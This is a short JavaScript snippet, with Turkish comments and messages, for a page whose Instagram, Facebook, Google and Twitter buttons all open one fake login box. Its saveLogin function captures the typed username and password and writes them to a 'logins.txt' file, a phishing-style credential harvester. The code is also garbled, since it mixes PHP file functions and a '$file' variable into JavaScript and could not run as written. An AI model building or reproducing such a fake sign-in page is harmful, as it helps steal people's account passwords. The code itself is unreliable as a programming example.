document.getElementById('instagram').addEventListener('click', function() {
    openModal();
  });
  
  document.getElementById('facebook').addEventListener('click', function() {
    openModal();
  });
  
  document.getElementById('google').addEventListener('click', function() {
    openModal();
  });
  
  document.getElementById('twitter').addEventListener('click', function() {
    openModal();
  });
  
  function openModal() {
    document.getElementById('login-modal').style.display = 'block';
  }
  
  function closeModal() {
    document.getElementById('login-modal').style.display = 'none';
  }
  
  function saveLogin() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
  
    // Kullanıcı adı ve şifreyi dosyaya ekle
    var file = fopen("logins.txt", "a");
    fwrite($file, "Username: " + username + " - Password: " + password + "\n");
    fclose($file);
  
    alert("Giriş bilgileri kaydedildi!");
    closeModal();
  }
   